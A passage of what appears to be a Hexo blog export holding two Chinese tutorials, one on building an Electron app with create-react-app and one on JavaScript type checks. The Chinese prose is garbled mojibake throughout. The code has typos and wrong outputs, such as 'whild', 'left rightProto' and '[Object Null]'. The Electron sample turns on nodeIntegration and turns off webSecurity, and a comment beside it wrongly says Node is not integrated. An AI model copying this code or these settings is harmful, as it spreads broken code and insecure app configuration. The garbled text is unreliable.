‡ï¼šæ­å»ºä¸€ä¸ªElectron + create-react-app + dva + react-router + antdçš„åº”ç”¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> ä½¿ç”¨create-react-appè„šæ‰‹æ¶</span><br><span class="line">create-react-app my-app</span><br><span class="line">cd my-app</span><br><span class="line">npm start</span><br><span class="line">npm run eject</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> å®‰è£…electron</span><br><span class="line">npm install electron --save</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> ä¿®æ”¹pakcage.json</span><br><span class="line">"main": "public/electron.js",</span><br><span class="line">"homepage": ".",</span><br><span class="line">"scripts": &#123;</span><br><span class="line">  "electron-dev": "ELECTRON_START_URL=http://localhost:3000 electron ."</span><br><span class="line">  "electron": "electron .",</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-æ·»åŠ electronå¯åŠ¨æ–‡ä»¶"><a href="#2-æ·»åŠ electronå¯åŠ¨æ–‡ä»¶" class="headerlink" title="2. æ·»åŠ electronå¯åŠ¨æ–‡ä»¶"></a>2. æ·»åŠ electronå¯åŠ¨æ–‡ä»¶</h3><p>åˆ›å»ºelectronå¯åŠ¨æ–‡ä»¶<code>/public/electron.js</code>ï¼Œæœ‰ä¸¤ç‚¹ä¿®æ”¹ï¼š</p><ul><li>å®šä¹‰å¼€å‘ç¯å¢ƒä¸‹<code>mainWindow.loadURL(&#39;http://localhost:3000&#39;)</code>,å‘å¸ƒç¯å¢ƒä¸‹åˆ™åŠ è½½ <code>build/index.html</code> æ–‡ä»¶ã€‚</li><li>å®šä¹‰<code>new BrowserWindow</code>çš„<code>webPreferences</code>å±æ€§ï¼ŒæŒ‡å®šé¢„åŠ è½½çš„jsæ–‡ä»¶(<code>./public/renderer.js</code>)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modules to control application life and create native browser window</span></span><br><span class="line"><span class="keyword">const</span> &#123;app, BrowserWindow, ipcMain, dialog &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"><span class="keyword">const</span> pkg = <span class="built_in">require</span>(<span class="string">'./package.json'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep a global reference of the window object, if you don't, the window will</span></span><br><span class="line"><span class="comment">// be closed automatically when the JavaScript object is garbage collected.</span></span><br><span class="line"><span class="keyword">let</span> mainWindow</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Create the browser window.</span></span><br><span class="line">  mainWindow = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    width: <span class="number">800</span>, </span><br><span class="line">    height: <span class="number">600</span>,</span><br><span class="line">    autoHideMenuBar: <span class="literal">true</span>,</span><br><span class="line">    fullscreenable: <span class="literal">false</span>,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">        javascript: <span class="literal">true</span>,</span><br><span class="line">        plugins: <span class="literal">true</span>,</span><br><span class="line">        nodeIntegration: <span class="literal">true</span>, <span class="comment">// ä¸é›†æˆ Nodejs</span></span><br><span class="line">        webSecurity: <span class="literal">false</span>,</span><br><span class="line">        preload: path.join(__dirname, <span class="string">'./public/renderer.js'</span>) </span><br><span class="line">        <span class="comment">// ä½†é¢„åŠ è½½çš„ js æ–‡ä»¶å†…ä»å¯ä»¥ä½¿ç”¨ Nodejs çš„ API</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// and load the index.html of the app.</span></span><br><span class="line">  <span class="comment">// è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œæ˜¯è®©æµè§ˆå™¨çª—å£åŠ è½½ç½‘é¡µã€‚</span></span><br><span class="line">  <span class="comment">// å¦‚æœæ˜¯å¼€å‘ç¯å¢ƒï¼Œåˆ™urlä¸ºhttp://localhost:3000ï¼ˆpackage.jsonä¸­é…ç½®ï¼‰</span></span><br><span class="line">  <span class="comment">// å¦‚æœæ˜¯ç”Ÿäº§ç¯å¢ƒï¼Œåˆ™urlä¸ºbuild/index.html</span></span><br><span class="line">  <span class="keyword">const</span> startUrl = process.env.ELECTRON_START_URL || url.format(&#123;</span><br><span class="line">      pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">      protocol: <span class="string">'file:'</span>,</span><br><span class="line">      slashes: <span class="literal">true</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// åŠ è½½ç½‘é¡µä¹‹åï¼Œä¼šåˆ›å»º`æ¸²æŸ“è¿›ç¨‹`</span></span><br><span class="line">  mainWindow.loadURL(startUrl);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the DevTools.</span></span><br><span class="line">  mainWindow.webContents.openDevTools()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Emitted when the window is closed.</span></span><br><span class="line">  mainWindow.on(<span class="string">'closed'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Dereference the window object, usually you would store windows</span></span><br><span class="line">    <span class="comment">// in an array if your app supports multi windows, this is the time</span></span><br><span class="line">    <span class="comment">// when you should delete the corresponding element.</span></span><br><span class="line">    mainWindow = <span class="literal">null</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This method will be called when Electron has finished</span></span><br><span class="line"><span class="comment">// initialization and is ready to create browser windows.</span></span><br><span class="line"><span class="comment">// Some APIs can only be used after this event occurs.</span></span><br><span class="line">app.on(<span class="string">'ready'</span>, createWindow)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quit when all windows are closed.</span></span><br><span class="line">app.on(<span class="string">'window-all-closed'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// On OS X it is common for applications and their menu bar</span></span><br><span class="line">  <span class="comment">// to stay active until the user quits explicitly with Cmd + Q</span></span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">'darwin'</span>) &#123;</span><br><span class="line">    app.quit()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.on(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// On OS X it's common to re-create a window in the app when the</span></span><br><span class="line">  <span class="comment">// dock icon is clicked and there are no other windows open.</span></span><br><span class="line">  <span class="keyword">if</span> (mainWindow === <span class="literal">null</span>) &#123;</span><br><span class="line">    createWindow()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// In this file you can include the rest of your app's specific main process</span></span><br><span class="line"><span class="comment">// code. You can also put them in separate files and require them here.</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-è°ƒè¯•è¿è¡Œ"><a href="#3-è°ƒè¯•è¿è¡Œ" class="headerlink" title="3. è°ƒè¯•è¿è¡Œ"></a>3. è°ƒè¯•è¿è¡Œ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> æœ¬åœ°è¿è¡Œï¼Œè¿è¡Œelectronï¼Œ</span><br><span class="line">npm run start</span><br><span class="line">npm run electron-dev</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> ç”Ÿäº§ç¯å¢ƒè¿è¡Œ</span><br><span class="line">npm run build</span><br><span class="line">npm run electron</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-åœ¨React-Appé‡Œè°ƒç”¨electron-API"><a href="#4-åœ¨React-Appé‡Œè°ƒç”¨electron-API" class="headerlink" title="4. åœ¨React Appé‡Œè°ƒç”¨electron API"></a>4. åœ¨React Appé‡Œè°ƒç”¨electron API</h3><p>æ‰€æœ‰Electronçš„APIéƒ½ä¼šè¢«æŒ‡æ´¾ç»™ä¸€ç§è¿›ç¨‹ç±»å‹ã€‚è®¸å¤šAPIåªèƒ½è¢«ç”¨äºä¸»è¿›ç¨‹æˆ–æ¸²æŸ“è¿›ç¨‹ï¼Œä½†æœ‰ä¸€äº›å¯ä»¥åŒæ—¶åœ¨ä¸Šè¿°ä¸¤ç§è¿›ç¨‹ä¸­ä½¿ç”¨ã€‚</p><ul><li><p>æ–°å»º <code>/public/renderer.js</code> æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åœ¨electronå…¥å£æ–‡ä»¶é‡Œå®šä¹‰ä¸ºé¢„åŠ è½½æ–‡ä»¶ã€‚é€šè¿‡requireçš„æ–¹å¼è·å–electronåŠå…¶ä»–APIï¼Œæš´éœ²electron API</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> electron = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸‰æ–¹Electron api</span></span><br><span class="line"><span class="keyword">var</span> ZegoLiveRoom = <span class="built_in">require</span>(<span class="string">"zegoliveroom/ZegoLiveRoom.js"</span>);</span><br><span class="line"><span class="keyword">var</span> ZEGOCONSTANTS = <span class="built_in">require</span>(<span class="string">"zegoliveroom/ZegoConstant.js"</span>);</span><br><span class="line"><span class="keyword">var</span> zegoClient = <span class="keyword">new</span> ZegoLiveRoom();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  zegoClient.initSDK(config)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">global.zego = &#123;</span><br><span class="line">  init,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>åœ¨Reactä¸­è°ƒç”¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/App.js</span></span><br><span class="line"><span class="keyword">const</span> electron = <span class="built_in">window</span>.electron;</span><br><span class="line"><span class="keyword">const</span> zego = <span class="built_in">window</span>.zego;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span>()</span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    zego.init()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hell<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.jianshu.com/p/5e41663825c6" target="_blank" rel="noopener">ä½¿ç”¨create-react-appç¼–å†™Electron app</a></li><li><a href="https://www.jianshu.com/p/96327b044e85" target="_blank" rel="noopener">Electron æ— è¾¹æ¡†çª—å£çš„æ‹–åŠ¨</a></li><li><a href="https://www.jianshu.com/p/0387bd0f8a70" target="_blank" rel="noopener">Electronä¸­BrowserWindowå¯¹è±¡çš„æ‰€æœ‰å¯è®¾ç½®é¡¹</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS åŸºæœ¬ç±»å‹ï¼Œåˆ¤æ–­å˜é‡ç±»å‹</title>
      <link href="/2019/07/29/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2019/07/29/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-typeof"><a href="#1-typeof" class="headerlink" title="1. typeof"></a>1. typeof</h3><p><em><code>typeof</code></em>åˆ¤æ–­å˜é‡å±äºå“ªä¸ªåŸºæœ¬ç±»å‹ã€‚æˆ‘ä»¬å¯ä»¥ç”¨typeofæ¥åˆ¤æ–­undefined, boolean, number, string, object, symbol, functionè¿™7ç§ç±»å‹ã€‚</p><p><em><code>typeof</code></em> å®ç°åŸç† : jsåœ¨åº•å±‚å­˜å‚¨å˜é‡çš„æ—¶å€™ï¼Œä¼šåœ¨å˜é‡çš„æœºå™¨ç çš„ä½ä½1-3ä½å­˜å‚¨å…¶ç±»å‹ä¿¡æ¯: 000-å¯¹è±¡ï¼Œ 010-æµ®ç‚¹æ•°ï¼Œ 100-å­—ç¬¦ä¸²ï¼Œ110-å¸ƒå°”ï¼Œ1-æ•´æ•°ï¼Œæ‰€æœ‰æœºå™¨ç å‡ä¸º0-nullï¼Œ-2^30æ•´æ•°æ¥è¡¨ç¤º-undefinedã€‚</p><p>å½“<code>typeof null</code>æ—¶ï¼Œ ç”±äº<code>null</code>çš„æ‰€æœ‰æœºå™¨ç å‡ä¸º0ï¼Œå› æ­¤è¢«å½“åšäº†å¯¹è±¡æ¥åˆ¤æ–­ã€‚å› æ­¤ï¼Œtypeofç”¨äºåˆ¤æ–­åŸºæœ¬æ•°æ®ç±»å‹ï¼Œé¿å…å¯¹nullçš„åˆ¤æ–­ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸ƒç§åŸºæœ¬ç±»å‹</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>      <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span>           <span class="comment">// 'boolean'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">42</span>             <span class="comment">// 'number'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">'42'</span>           <span class="comment">// 'string'</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;<span class="attr">life</span>: <span class="number">42</span>&#125;     <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125; <span class="comment">// 'function'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Symbol</span>()       <span class="comment">// 'symbol'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// other</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">void</span> <span class="number">0</span>         <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]        <span class="comment">// 'object' æ•°ç»„ï¼Œå…¶å®ä¹Ÿæ˜¯å¯¹è±¡</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Date</span>()     <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>           <span class="comment">// 'object' jsçš„bugå¯¼è‡´è¿”å›object</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-Object-prototype-toString-call"><a href="#2-Object-prototype-toString-call" class="headerlink" title="2. Object.prototype.toString.call"></a>2. Object.prototype.toString.call</h3><p>Object.prototype.toString.call() åˆ¤æ–­å¯¹è±¡å±äºå“ªä¸ªå†…ç½®ç±»å‹ã€‚</p><p>ES5ä¸­æ¯ç§å†…ç½®å¯¹è±¡éƒ½å®šä¹‰äº†<em><code>[[Class]]</code></em>å†…éƒ¨å±æ€§çš„å€¼ã€‚å®¿ä¸»å¯¹è±¡çš„[[Class]]å†…éƒ¨å±æ€§çš„å€¼å¯ä»¥æ˜¯é™¤äº†Arguments, Array, Boolean, Date, Error, Function, JSON, Math, Number, Object, RegExp, Stringçš„ä»»ä½•å­—ç¬¦ä¸²ã€‚</p><p>ES6ä¸­ï¼Œä¹‹å‰çš„<em><code>[[Class]]</code></em>ä¸å†ä½¿ç”¨ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯<code>internal slot</code>ã€‚Internal slotså¯¹åº”äºä¸å¯¹è±¡ç›¸å…³è”å¹¶ç”±å„ç§esè§„èŒƒç®—æ³•ä½¿ç”¨çš„å†…éƒ¨çŠ¶æ€ï¼Œå®ƒä»¬æ²¡æœ‰å¯¹è±¡å±æ€§ï¼Œä¹Ÿä¸èƒ½è¢«ç»§æ‰¿ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">null</span>)            <span class="comment">// "[Object Null]"  </span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">undefined</span>)       <span class="comment">// "[Object Undefined]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="number">123</span>)             <span class="comment">// "[Object Number]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">true</span>)            <span class="comment">// "[Object Boolean]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="string">'123'</span>)           <span class="comment">// "[Object String]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(&#123;<span class="attr">a</span>: <span class="number">123</span>&#125;)        <span class="comment">// "[Object Object]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Symbol</span>())        <span class="comment">// "[Object Symbol]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])         <span class="comment">// "[Object Array]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;)  <span class="comment">// "[Object Function]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Date</span>)        <span class="comment">// "[Object Date]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Math</span>)            <span class="comment">// "[Object Math]"</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-constructor"><a href="#3-constructor" class="headerlink" title="3. constructor"></a>3. constructor</h3><p>constructorç”¨äºåˆ¤æ–­å¯¹è±¡çš„æ„é€ å‡½æ•°æ˜¯è°<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span>.constructor        <span class="comment">// Uncaught TypeError: Cannot read property 'constructor' of null</span></span><br><span class="line"><span class="literal">undefined</span>.constructor   <span class="comment">// Uncaught TypeError: Cannot read property 'constructor' of null</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].constructor === <span class="built_in">Array</span>     <span class="comment">// true</span></span><br><span class="line">(<span class="number">123</span>).constructor === <span class="built_in">Number</span>      <span class="comment">// true</span></span><br><span class="line"><span class="string">'123'</span>.constructor === <span class="built_in">String</span>      <span class="comment">// true</span></span><br><span class="line">(&#123;<span class="attr">a</span>:<span class="number">1</span>&#125;).constructor === <span class="built_in">Object</span>    <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Symbol</span>().constructor === <span class="built_in">Symbol</span>   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">func.constructor === <span class="built_in">Function</span>     <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">date.constructor === <span class="built_in">Date</span>         <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>()</span><br><span class="line">reg.constructor === <span class="built_in">RegExp</span>        <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m = <span class="built_in">Math</span></span><br><span class="line">m.constructor === <span class="built_in">Math</span>            <span class="comment">// false,äº‹å®ä¸Šæ²¡æœ‰Mathè¿™ä¸ªæ„é€ å‡½æ•°ï¼ŒMathçš„æ„é€ å‡½æ•°åœ¨Objectä¸Š</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-instanceof"><a href="#4-instanceof" class="headerlink" title="4. instanceof"></a>4. instanceof</h3><p>æ£€æµ‹æ„é€ å‡½æ•°çš„<code>prototype</code>å±æ€§æ˜¯å¦å‡ºç°åœ¨å¯¹è±¡åŸå‹é“¾ä¸­çš„ä»»ä½•ä½ç½®ã€‚ä½¿ç”¨å¯¹è±¡å¿…é¡»æ˜¯ä¸€ä¸ªobjectï¼Œåˆ¤æ–­å¯¹è±¡ç»§æ‰¿äºå“ªä¸ªå¯¹è±¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> programmer = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">programmer.prototype = <span class="keyword">new</span> person()</span><br><span class="line"><span class="keyword">let</span> mike = <span class="keyword">new</span> programmer()</span><br><span class="line"></span><br><span class="line">mike <span class="keyword">instanceof</span> programmer   <span class="comment">// true</span></span><br><span class="line">mide <span class="keyword">instanceof</span> person       <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><em><code>instanceof</code></em>çš„å®ç°åŸç†ï¼šåªè¦å³è¾¹å˜é‡çš„<code>prototype</code>åœ¨å·¦è¾¹å˜é‡çš„åŸå‹é“¾ä¸Šå³å¯ã€‚å› æ­¤ï¼Œ<code>instanceof</code>åœ¨æŸ¥æ‰¾çš„è¿‡ç¨‹ä¸­ä¼šéå†å·¦è¾¹å˜é‡çš„åŸå‹é“¾ï¼Œç›´åˆ°æ‰¾åˆ°å³è¾¹å˜é‡çš„<code>prototype</code>ï¼Œå¦‚æœæŸ¥æ‰¾å¤±è´¥ï¼Œè¿”å›<code>false</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_instance_of</span>(<span class="params">leftValue, rightValue</span>) </span>&#123;</span><br><span class="line">  left rightProto = rightValue.prototype;</span><br><span class="line">  leftValue = leftValue.__proto__;</span><br><span class="line"></span><br><span class="line">  whild(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (leftValue === <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (leftValue === rightProto) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leftValue = leftValue.__proto__;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-å¸¸ç”¨åˆ¤æ–­"><a href="#5-å¸¸ç”¨åˆ¤æ–­" class="headerlink" title="5. å¸¸ç”¨åˆ¤æ–­"></a>5. å¸¸ç”¨åˆ¤æ–­</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// null</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isNull</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj === <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isUndefined</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj === <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°ç»„</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([<span class="number">1</span>,<span class="number">2</span>]) === <span class="string">'[object Array]'</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><ul><li><a href="https://juejin.im/post/5aba32d9f265da239e4e1b6c" target="_blank" rel="noopener">JSçµå·§åˆ¤æ–­7ç§ç±»å‹çš„æ–¹å¼</a></li><li><a href="https://juejin.im/post/591647550ce4630069df1c4a" target="_blank" rel="noopener">è°ˆè°ˆ Object.prototype.toString</a></li><li><a 